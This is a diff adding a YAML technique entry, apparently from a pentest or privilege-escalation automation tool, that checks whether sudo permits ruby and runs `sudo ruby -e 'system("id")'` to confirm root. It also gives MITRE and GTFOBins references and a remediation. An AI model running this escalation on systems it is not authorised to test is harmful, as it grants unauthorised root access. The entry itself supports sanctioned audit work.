@@ -1,0 +1,25 @@
+# Sudo → root via ruby (GTFOBins)
+technique: T1548.003
+name: Sudo → root via ruby (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: ruby
+execute:
+  command: |-
+    sudo ruby -e 'system("id")'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `ruby` allows arbitrary system() as root.
+  remediation: >
+    Drop `ruby` from sudoers.
+  refs: [T1548.003, GTFOBins/ruby]
